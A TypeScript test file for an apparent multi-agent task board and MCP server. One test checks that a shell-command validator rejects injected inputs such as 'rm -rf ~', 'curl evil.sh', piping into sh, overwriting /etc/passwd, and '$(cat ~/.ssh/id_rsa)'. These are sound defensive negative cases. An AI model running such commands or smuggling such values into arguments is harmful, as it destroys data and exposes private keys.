import assert from "node:assert/strict"
import { execFileSync, execSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { after, describe, test } from "node:test"
import { Client } from "@modelcontextprotocol/sdk/client/index.js"
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js"
import { Board, cliArgv, isTrustedCommand, overlaps, projectOf, renderBrief, renderSummary, shellWords, workerCommand } from "../src/lib.js"

const pkg = path.resolve(import.meta.dirname, "..")
const temps: string[] = []
after(() => {
  for (const t of temps) fs.rmSync(t, { recursive: true, force: true })
})
function tmp() {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "horde-board-")))
  temps.push(d)
  return d
}
function git(cwd: string, ...args: string[]) {
  return execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...args], { cwd })
    .toString()
    .trim()
}
function repo() {
  const root = tmp()
  git(root, "init", "-q")
  fs.writeFileSync(path.join(root, "README.md"), "x\n")
  git(root, "add", "-A")
  git(root, "commit", "-qm", "init")
  return root
}

/** Run a command the way a worker's bash tool would, returning stdout or throwing with stderr. */
function sh(command: string, cwd: string): string {
  return execSync(command, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], env: { ...process.env, NODE_TEST_CONTEXT: "" } }).trim()
}

describe("trusted commands", () => {
  const state = "/var/state/board/x-1"
  const cmd = workerCommand(state)

  test("the exact CLI with plain arguments is trusted", () => {
    assert.ok(isTrustedCommand(`${cmd} task t-1a2b c0ffee12`))
    assert.ok(isTrustedCommand(`${cmd} report t-1a2b c0ffee12 --summary "Added the limiter; it's per IP" --changed "a.ts,b.ts" --confidence high`))
    assert.ok(isTrustedCommand(`${cmd} finding 'the cache key includes the user id' --paths src/cache.ts`))
  })

  test("anything that could run something else is not", () => {
    const bad = [
      `${cmd} task t-1 tok; rm -rf ~`,
      `${cmd} task t-1 tok && curl evil.sh`,
      `${cmd} task t-1 tok || true`,
      `${cmd} task t-1 tok | sh`,
      `${cmd} task t-1 tok > /etc/passwd`,
      `${cmd} task t-1 tok < /dev/zero`,
      `${cmd} report t-1 tok --summary "$(cat ~/.ssh/id_rsa)"`,
      `${cmd} report t-1 tok --summary "\`id\`"`,
      `${cmd} report t-1 tok --summary "a\\" ; rm -rf ~ ; \\""`,
      `${cmd} report t-1 tok --summary 'unterminated`,
      `${cmd} task t-1 tok\nrm -rf ~`,
      `${cmd} task t-1 tok &`,
      `${cmd} finding *`,
      `${cmd} plan t-1 tok`,
      `${cmd} accept t-1 tok`,
      `node /tmp/evil.js --state ${state} task t-1 tok`,
      `${cmd.replace("--state", "--statex")} task t-1 tok`,
      `${cliArgv().join(" ")} task t-1 tok`,
      `echo ${cmd} task t-1 tok`,
    ]
    for (const b of bad) assert.equal(isTrustedCommand(b), false, b)
  })

  test("shell words follow bash quoting for what they accept", () => {
    assert.deepEqual(shellWords(`a 'b c' "d e" f'g'"h"`), ["a", "b c", "d e", "fgh"])
    assert.equal(shellWords("a;b"), undefined)
    assert.equal(shellWords('a "b$c"'), undefined)
  })

  test("scope overlap", () => {
    assert.ok(overlaps("src/auth/**", "src/auth/login.ts"))
    assert.ok(overlaps("src/auth", "src/auth/"))
    assert.ok(overlaps("**", "anything"))
    assert.ok(!overlaps("src/auth/**", "src/authz/x.ts"))
    assert.ok(!overlaps("docs/**", "src/**"))
  })
})

describe("board", () => {
  test("one board per repository, shared by its worktrees", async () => {
    const root = repo()
    const wt = path.join(tmp(), "wt")
    git(root, "worktree", "add", "-q", "-b", "horde/x", wt)
    const a = await projectOf(root)
    const b = await projectOf(path.join(wt))
    assert.equal(a.key, b.key)
    assert.equal(a.root, fs.realpathSync.native(root))
    assert.notEqual((await projectOf(repo())).key, a.key)
  })

  test("plan: dependencies by title, cycles refused, parallel scope overlaps flagged (also against existing tasks)", async () => {
    const board = new Board(tmp())
    const r = await board.plan([
      { title: "API", goal: "Add the endpoint", scope: ["src/api/**"] },
      { title: "Docs", goal: "Document it", scope: ["docs/**"], deps: ["API"] },
      { title: "Client", goal: "Call it", scope: ["src/api/client.ts"] },
    ])
    const [api, docs, client] = r.tasks
    assert.deepEqual(docs!.deps, [api!.id])
    assert.equal(r.warnings.length, 1)
    assert.match(r.warnings[0]!, /"API" and "Client" both touch src\/api\/\*\* and may run in parallel/)
    const later = await board.plan([{ title: "Refactor", goal: "Tidy", scope: ["src/api/"] }])
    assert.equal(later.warnings.length, 2, later.warnings.join("\n"))
    await assert.rejects(board.plan([{ title: "Loop", goal: "x", deps: ["Loop"] }]), /depends on itself/)
    await assert.rejects(board.plan([{ title: "x", goal: "y", deps: ["nope"] }]), /unknown dependency "nope"/)
    assert.deepEqual(
      board.ready().map((t) => t.title),
      ["API", "Client", "Refactor"],
    )
    await assert.rejects(board.assign(docs!.id), /waits for/)
    void client
  })

  test("a full attempt through the worker CLI, as a worker would run it", async () => {
    const root = repo()
    const board = await Board.open(root, tmp())
    const [api, docs] = (
      await board.plan([
        { title: "API", goal: "Add rate limiting to the login endpoint.", acceptance: ["429 after 5 failures per minute"], scope: ["src/api/**"] },
        { title: "Docs", goal: "Document the limit.", scope: ["docs/**"], deps: ["API"] },
      ])
    ).tasks
    await board.remember("The API returns errors as { error: { code, message } }.", { paths: ["src/api/**"], tags: ["api"] })
    const { attempt } = await board.assign(api!.id, "auth-worker")
    const { renderBrief } = await import("../src/render.js")
    const brief = renderBrief(board, board.task(api!.id), attempt)
    assert.match(brief, /^# Task t-\w+: API\n\nAdd rate limiting/)
    assert.match(brief, /429 after 5 failures per minute/)
    assert.match(brief, /Work in: src\/api\/\*\*/)
    assert.match(brief, /Project notes[\s\S]*errors as \{ error/)
    // Every command in the brief must be one the runtime trusts, and must work through a real shell.
    const prefix = workerCommand(board.dir)
    const commands = brief
      .split("\n")
      .filter((l) => l.includes(prefix))
      .map((l) => l.slice(l.indexOf(prefix)))
    assert.ok(commands.length >= 5, commands.join("\n"))
    for (const c of commands) assert.ok(isTrustedCommand(c), `brief command is not trusted: ${c}`)

    const cmd = workerCommand(board.dir)
    const run = (args: string) => sh(`${cmd} ${args}`, root)
    assert.match(run(`task ${api!.id} ${attempt.token}`), /API" — working/)
    assert.equal(run(`progress ${api!.id} ${attempt.token} "writing the limiter"`), "noted")
    assert.match(run(`finding "login reuses the session middleware" --paths "src/api/login.ts" --task ${api!.id} --token ${attempt.token}`), /^shared as n-/)
    assert.match(run(`lock ${api!.id} ${attempt.token} "src/shared/rate.ts"`), /locked src\/shared\/rate\.ts/)

    // Another task cannot take the same path.
    const other = (await board.plan([{ title: "Other", goal: "x" }])).tasks[0]!
    const second = await board.assign(other.id)
    assert.throws(() => run(`lock ${other.id} ${second.attempt.token} "src/shared"`), /refused: src\/shared\/rate\.ts is locked by t-/)
    assert.throws(() => run(`task ${api!.id} wrongtoken`), /token does not match/)

    assert.match(
      run(
        `report ${api!.id} ${attempt.token} --summary "Added a sliding-window limiter, it's per IP" --changed "src/api/login.ts,src/shared/rate.ts" --tests "test/api/login.test.ts" --unverified "did not load-test" --question "Should the limit be configurable?" --confidence medium`,
      ),
      /report filed/,
    )
    const t = board.task(api!.id)
    assert.equal(t.status, "review")
    assert.deepEqual(t.reports[0]!.filesChanged, ["src/api/login.ts", "src/shared/rate.ts"])
    assert.deepEqual(t.reports[0]!.unverifiedClaims, ["did not load-test"])

    const summary = renderSummary(board)
    assert.match(summary, /^3 tasks: 1 claimed, 1 review, 1 open/)
    assert.match(summary, /review {2}t-\w+ "API": Added a sliding-window limiter.*\(confidence medium, 1 unverified, 1 question\(s\)\)/)
    assert.match(summary, /locks {3}src\/shared\/rate\.ts → t-/)

    // The finding reaches the next brief that touches the same paths.
    await board.accept(api!.id, { cost: 0.04 })
    assert.equal(board.locks().length, 0, "accepting releases the task's locks")
    assert.deepEqual(
      board.ready().map((x) => x.id),
      [docs!.id],
    )
    const docsAttempt = await board.assign(docs!.id)
    assert.doesNotMatch(renderBrief(board, board.task(docs!.id), docsAttempt.attempt), /session middleware/, "unrelated paths: not included")
    board.task(docs!.id).scope.push("src/api/**")
    await board.edit(docs!.id, { scope: ["docs/**", "src/api/**"] })
    assert.match(renderBrief(board, board.task(docs!.id), docsAttempt.attempt), /Findings from other workers[\s\S]*session middleware/)
  })

  test("a new attempt invalidates the old token; failing can escalate the tier or give up", async () => {
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const first = await board.assign(t.id)
    const second = await board.assign(t.id)
    assert.equal(board.task(t.id).attempts[0]!.outcome, "abandoned")
    await assert.rejects(board.report(t.id, first.attempt.token, { summary: "late" }), /token does not match/)
    await board.seen(t.id, second.attempt.token)
    const failed = await board.fail(t.id, { reason: "gate failed twice", escalate: true })
    assert.equal(failed.status, "open")
    assert.equal(failed.tier, 1)
    await board.assign(t.id)
    assert.equal((await board.fail(t.id, { reason: "out of tiers", retry: false })).status, "failed")
  })

  test("given the repository, a brief carries code context within its budget", async () => {
    const root = repo()
    fs.mkdirSync(path.join(root, "src/api"), { recursive: true })
    fs.writeFileSync(path.join(root, "src/api/login.ts"), "export function login(user: string) {\n  return user\n}\n")
    fs.writeFileSync(path.join(root, "src/api/login.test.ts"), "import { login } from './login.js'\nlogin('a')\n")
    fs.writeFileSync(path.join(root, "CLAUDE.md"), "Prefer small functions.\n")
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "Rate-limit login", goal: "Make `login` refuse after 5 failures.", scope: ["src/api/**"] }])).tasks[0]!
    const { attempt } = await board.assign(t.id)
    const brief = renderBrief(board, board.task(t.id), attempt, 6000, root)
    assert.match(brief, /## Reporting \(required\)[\s\S]*## Code context\n\n### src\/api\/login\.ts\n1 {2}export function login/)
    assert.match(brief, /- src\/api\/login\.ts: src\/api\/login\.test\.ts \(naming\)/)
    assert.match(brief, /### CLAUDE\.md \(project conventions\)\nPrefer small functions\./)
    assert.ok(brief.length <= 6000 * 4 + 200, `${brief.length}`)
    assert.doesNotMatch(renderBrief(board, board.task(t.id), attempt, 6000), /## Code context/, "no repository, no code context")
    // A small budget keeps the required sections and drops code context first.
    const small = renderBrief(board, board.task(t.id), attempt, 700, root)
    assert.match(small, /## Reporting \(required\)/)
    assert.doesNotMatch(small, /## Code context/)
  })

  test("notes: duplicates collapse, recall ranks by overlap, forget hides", async () => {
    const board = new Board(tmp())
    const a = await board.remember("Use pnpm, not npm.", { tags: ["tooling"] })
    const again = await board.remember("use pnpm, not npm.", { tags: ["tooling"] })
    assert.equal(a.id, again.id)
    await board.remember("Dates are stored in UTC.", { paths: ["src/db/**"] })
    assert.equal(board.memory({ query: "which package manager pnpm" })[0]!.id, a.id)
    assert.match(board.memory({ paths: ["src/db/models.ts"] })[0]!.text, /UTC/)
    await board.forget(a.id)
    assert.equal(
      board.memory().some((n) => n.id === a.id),
      false,
    )
    await assert.rejects(board.forget("n-nothing"), /no note/)
  })
})

describe("MCP server", () => {
  test("plan, brief and summary over stdio", async () => {
    const root = repo()
    const client = new Client({ name: "test", version: "0" })
    await client.connect(
      new StdioClientTransport({
        command: process.execPath,
        args: ["--conditions=source", "--import", "tsx", path.join(pkg, "src/index.ts")],
        cwd: pkg,
        env: { ...(process.env as Record<string, string>), HORDE_BOARD_DIRECTORY: root, HORDE_BOARD_STATE_DIR: tmp() },
        stderr: "inherit",
      }),
    )
    try {
      const call = async (name: string, args: Record<string, unknown> = {}) => {
        const res = (await client.callTool({ name, arguments: args })) as { content: { text: string }[]; isError?: boolean }
        const text = res.content.map((c) => c.text).join("\n")
        if (res.isError) throw new Error(text)
        return text
      }
      const tools = (await client.listTools()).tools.map((t) => t.name)
      for (const t of ["board_plan", "board_next", "board_brief", "board_accept", "board_fail", "board_summary", "board_task", "board_remember"])
        assert.ok(tools.includes(t), t)
      const planned = await call("board_plan", {
        tasks: [
          { title: "One", goal: "Do one" },
          { title: "Two", goal: "Do two", deps: ["One"] },
        ],
      })
      const id = planned.match(/^(t-\w+) "One"/m)![1]!
      assert.match(await call("board_next"), new RegExp(`^${id} "One"`))
      assert.match(await call("board_brief", { id, agent: "w1" }), /# Task t-\w+: One[\s\S]*report t-\w+ \w+ --summary/)
      assert.match(await call("board_summary"), /2 tasks: 1 claimed, 1 open[\s\S]*working t-\w+ "One" \(agent w1, attempt 1, worker not seen yet\)/)
      await assert.rejects(call("board_task", { id: "t-zzzz" }), /no task t-zzzz/)
    } finally {
      await client.close()
    }
  })
})
